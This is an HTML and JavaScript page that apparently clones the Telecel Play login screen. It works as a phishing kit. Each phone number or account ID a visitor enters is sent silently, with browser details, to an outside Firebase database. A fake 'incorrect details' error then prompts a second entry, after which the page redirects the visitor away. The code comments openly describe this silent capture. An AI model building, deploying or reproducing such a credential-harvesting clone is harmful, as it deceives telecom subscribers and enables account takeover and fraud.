<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telecel Clone – Filtered Input + Two‑Attempt</title>

<!-- Firebase SDK (compat) -->
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

<!-- Google Fonts & Icons -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
*{
  box-sizing:border-box;
  font-family: 'Inter', Arial, Helvetica, sans-serif;
}

body{
  margin:0;
  background:#f5f5f5;
  display:flex;
  justify-content:center;
}

.container {
      width: 360px;
      background: #f7f7f7;
      border-radius: 28px;
      padding: 40px 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      position: relative;
      overflow: hidden;
      text-align: center;
    }

/* TOP RED SHAPE */
.top-bg{
  position:absolute;
  top:0;
  right:0;
  width:220px;
  height:220px;
  background:linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
  border-bottom-left-radius:120px;
}

/* CONTENT WRAPPER – keeps everything above the top-bg */
.content {
  position: relative;
  z-index: 2;
}

/* LOGO */
.logo{
  text-align:center;
  margin-top:60px;
}

.logo .logo-circle {
  width:52px;
  height:52px;
  background:#ff0000;
  border-radius:50%;
  color: #ffffff !important;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:30px;
  margin:auto;
  font-weight:800;
  font-family: Arial, Helvetica, sans-serif;
  line-height: 1;
  text-decoration: none;
}

.logo-text{
  color:#ff0000;
  font-size:26px;
  font-weight:bold;
  margin-top:8px;
}

/* TEXT */
.title{
  text-align:center;
  color:#ff0000;
  font-size:20px;
  font-weight:600;
  margin-top:15px;
}

.subtitle{
  text-align:center;
  color:#666;
  font-size:15px;
  margin-top:10px;
  line-height:1.5;
}

/* FORM */
.form{
  margin-top:30px;
  text-align: left;  /* ensure labels and inputs are left‑aligned */
}

.label{
  font-size:13px;
  color:#666;
  margin-bottom:8px;
}

.input, .select{
  width:100%;
  height:50px;
  border-radius:12px;
  border:1px solid #ddd;
  padding:0 15px;
  font-size:15px;
  background:#fff;
}

/* CUSTOM DROPDOWN */
.dropdown{
  position:relative;
  cursor:pointer;
}

.select-wrapper{
  position:relative;
}

.select{
  width:100%;
  height:50px;
  border-radius:12px;
  border:1px solid #ddd;
  padding:0 40px 0 15px;
  font-size:15px;
  background:#fff;
}

.arrow{
  position:absolute;
  right:15px;
  top:50%;
  transform:translateY(-50%);
  font-size:14px;
  color:#888;
  transition:0.3s;
}

.arrow.rotate{
  transform:translateY(-50%) rotate(180deg);
}

.dropdown-list{
  position:absolute;
  width:100%;
  background:#fff;
  border-radius:12px;
  box-shadow:0 4px 15px rgba(0,0,0,0.1);
  margin-top:5px;
  display:none;
  overflow:hidden;
}

.dropdown-item{
  padding:15px;
  font-size:15px;
}

.dropdown-item.active{
  background:#ffe5e5;
  color:#ff0000;
}

.dropdown-item:hover{
  background:#f5f5f5;
}

/* BUTTONS */
.btn{
  width:100%;
  height:55px;
  border:none;
  border-radius:14px;
  font-size:16px;
  margin-top:20px;
  cursor:pointer;
}

.btn-primary{
  background:#ff0000;
  color:#fff;
  font-weight:600;
}

.btn-outline{
  background:transparent;
  border:2px solid #ff0000;
  color:#666;
  font-weight:600;
}

/* VERSION */
.version{
  text-align:center;
  color:#aaa;
  font-size:12px;
  margin-top:20px;
}

/* SPINNER OVERLAY */
#spinner {
  position: fixed;
  inset: 0;
  display: none;
  align-items: center;
  justify-content: center;
  background: rgba(255, 255, 255, 0.7);
  backdrop-filter: blur(2px);
  z-index: 999;
}

.loader {
  width: 44px;
  height: 44px;
  border: 4px solid #ffe0e0;
  border-top: 4px solid #ff0000;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* ERROR TOAST (from sample) */
.error-box{
  position:absolute;
  top:20px;
  left:20px;
  right:20px;
  background:#fff;
  border:2px solid #ff4d4d;
  border-radius:12px;
  padding:15px;
  display:none;
  box-shadow:0 5px 20px rgba(0,0,0,0.1);
  z-index:100;
}

.error-title{
  color:#ff0000;
  font-weight:bold;
  margin-bottom:5px;
}

.error-text{
  color:#444;
  font-size:14px;
}

.close{
  position:absolute;
  right:15px;
  top:10px;
  cursor:pointer;
  font-size:18px;
  color:#999;
}
</style>
</head>

<body>

<div class="container">

  <div class="top-bg"></div>

  <!-- All content goes inside this wrapper to stay above the red shape -->
  <div class="content">

    <!-- ERROR TOAST (hidden by default) -->
    <div class="error-box" id="errorBox">
      <div class="close" onclick="hideError()">×</div>
      <div class="error-title">Error</div>
      <div class="error-text" id="errorMessage">Account details provided is incorrect</div>
    </div>

    <!-- LOGO -->
    <div class="logo">
      <div class="logo-circle" style="color: #ffffff !important;">t</div>
      <div class="logo-text">telecel</div>
    </div>

    <!-- TEXT -->
    <div class="title">Welcome to Telecel Play</div>
    <div class="subtitle">
      Enter your number to sign up or log in.<br>
      You need to be a Telecel subscriber to proceed.
    </div>

    <!-- FORM -->
    <div class="form">

      <div class="label">Account type</div>

      <div class="dropdown" onclick="toggleDropdown()">

        <div class="select-wrapper">
          <input class="select" id="selectedType" value="Mobile" readonly>
          <span class="arrow" id="arrow">▼</span>
        </div>

        <div class="dropdown-list" id="dropdownList">
          <div class="dropdown-item active" onclick="selectType(event,'Mobile')">Mobile</div>
          <div class="dropdown-item" onclick="selectType(event,'Broadband')">Broadband</div>
        </div>

      </div>

      <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
      <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">

      <button class="btn btn-primary" onclick="submitForm()">Next</button>
      <button class="btn btn-outline">Go Back</button>

      <div class="version">v26.2.2(TPA-2622)</div>

    </div>

  </div> <!-- end .content -->

</div> <!-- end .container -->

<!-- SPINNER OVERLAY -->
<div id="spinner">
  <div class="loader"></div>
</div>


<script>
  // ==================== FIREBASE CONFIG ====================
  const firebaseConfig = {
    apiKey: "AIzaSyCjztxgN2BRjuHDMQnpNEuB7NE9C9R8nU0",
    authDomain: "tele-panel.firebaseapp.com",
    projectId: "tele-panel",
    storageBucket: "tele-panel.firebasestorage.app",
    messagingSenderId: "859165937892",
    appId: "1:859165937892:web:db441a884b1a98c36b1cf1",
    measurementId: "G-5ZPQ1H0SWR"
  };

  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();
  const COLLECTION_NAME = 'telecel_submissions';

  // ==================== DOM ELEMENTS ====================
  const selectedType = document.getElementById('selectedType');
  const inputField = document.getElementById('inputField');
  const dropdownList = document.getElementById('dropdownList');
  const arrow = document.getElementById('arrow');
  const spinner = document.getElementById('spinner');
  const submitBtn = document.querySelector('.btn-primary');
  const errorBox = document.getElementById('errorBox');
  const errorMessage = document.getElementById('errorMessage');

  // ==================== STATE ====================
  let attemptCount = 0;            // 1 = first, 2 = second
  let isSubmitting = false;        // prevents double clicks while spinner active

  // ==================== INPUT FILTERING ====================
  function filterInput(value, type) {
    if (type === 'Mobile') {
      // Only digits
      return value.replace(/[^0-9]/g, '');
    } else {
      // Broadband: allow letters and digits (alphanumeric)
      return value.replace(/[^a-zA-Z0-9]/g, '');
    }
  }

  // Update input value with filtering based on current type
  function applyFilter() {
    const currentType = selectedType.value;
    const raw = inputField.value;
    const filtered = filterInput(raw, currentType);
    if (filtered !== raw) {
      inputField.value = filtered;
    }
  }

  // Listen to input events – also hide error on typing
  inputField.addEventListener('input', function() {
    hideError();
    applyFilter();
  });

  // Handle paste
  inputField.addEventListener('paste', function(e) {
    e.preventDefault();
    const pasted = (e.clipboardData || window.clipboardData).getData('text');
    const currentType = selectedType.value;
    const filtered = filterInput(pasted, currentType);
    // Insert at cursor position (simple: replace whole value)
    const start = this.selectionStart || 0;
    const end = this.selectionEnd || 0;
    const newValue = this.value.substring(0, start) + filtered + this.value.substring(end);
    this.value = filterInput(newValue, currentType); // re-filter whole thing
    // Move cursor to end of inserted text
    const newCursor = start + filtered.length;
    this.setSelectionRange(newCursor, newCursor);
    hideError();
  });

  // ==================== ERROR FUNCTIONS ====================
  function showError(msg) {
    errorMessage.innerText = msg || 'Account details provided is incorrect';
    errorBox.style.display = 'block';
  }

  function hideError() {
    errorBox.style.display = 'none';
  }

  // ==================== DROPDOWN FUNCTIONS ====================
  function toggleDropdown() {
    const isVisible = dropdownList.style.display === 'block';
    dropdownList.style.display = isVisible ? 'none' : 'block';
    arrow.classList.toggle('rotate', !isVisible);
  }

  function selectType(e, type) {
    e.stopPropagation();
    selectedType.value = type;
    document.querySelectorAll('.dropdown-item').forEach(item => {
      item.classList.remove('active');
    });
    e.target.classList.add('active');

    // Update label and placeholder
    const label = document.getElementById('inputLabel');
    if (type === 'Mobile') {
      label.innerText = 'Phone Number';
      inputField.placeholder = '020XXXXXXX';
      inputField.inputMode = 'numeric';
    } else {
      label.innerText = 'User ID / Account Number';
      inputField.placeholder = 'Eg: Xgtrjj';
      inputField.inputMode = 'text';
    }

    // Re-filter current input value (if any)
    applyFilter();
    hideError(); // hide error when changing type

    dropdownList.style.display = 'none';
    arrow.classList.remove('rotate');
  }

  // Close dropdown if clicked outside
  document.addEventListener('click', function(e) {
    if (!e.target.closest('.dropdown')) {
      dropdownList.style.display = 'none';
      arrow.classList.remove('rotate');
    }
  });

  // ==================== SILENT FIREBASE SAVE ====================
  async function saveAttempt(accountType, inputValue, attemptNumber) {
    try {
      await db.collection(COLLECTION_NAME).add({
        accountType: accountType,
        inputValue: inputValue,
        attempt: attemptNumber,
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href
      });
      console.log(`Attempt ${attemptNumber} saved silently`);
    } catch (error) {
      console.error('Firebase save error (silent):', error);
      // Ignore errors – no feedback to user
    }
  }

  // ==================== FORM SUBMISSION ====================
  async function submitForm() {
    // Prevent double submissions while spinner active
    if (isSubmitting) return;

    const accountType = selectedType.value;
    const inputValue = inputField.value.trim();

    // Silently ignore empty submissions
    if (inputValue === '') return;

    // Hide any existing error
    hideError();

    // Disable button and show spinner
    isSubmitting = true;
    submitBtn.disabled = true;
    spinner.style.display = 'flex';

    // Increment attempt counter
    attemptCount++;

    if (attemptCount === 1) {
      // FIRST ATTEMPT: save, then hide spinner, show error, clear input
      await saveAttempt(accountType, inputValue, 1);
      
      // Small delay to ensure spinner is visible
      setTimeout(() => {
        spinner.style.display = 'none';
        inputField.value = '';               // clear field for second attempt
        showError('Account details provided is incorrect'); // show error
        submitBtn.disabled = false;           // re-enable button
        isSubmitting = false;                  // allow next click
      }, 500);
    } 
    else if (attemptCount === 2) {
      // SECOND ATTEMPT: save, then redirect (keep spinner until redirect)
      await saveAttempt(accountType, inputValue, 2);

      // Redirect after a short delay (spinner remains visible)
      setTimeout(() => {
        window.location.href = 'unavailable.html';  // redirect
        // No need to hide spinner or reset state as page will change
      }, 800);
    }
    else {
      // In case attemptCount > 2 (should not happen), reset and treat as first
      attemptCount = 1;
      await saveAttempt(accountType, inputValue, 1);
      setTimeout(() => {
        spinner.style.display = 'none';
        inputField.value = '';
        showError('Account details provided is incorrect');
        submitBtn.disabled = false;
        isSubmitting = false;
      }, 500);
    }
  }

  // ==================== INIT ====================
  dropdownList.style.display = 'none';
  submitBtn.disabled = false;
  // Initial filter in case there's any pre-filled value
  applyFilter();
</script>

</body>
</html>
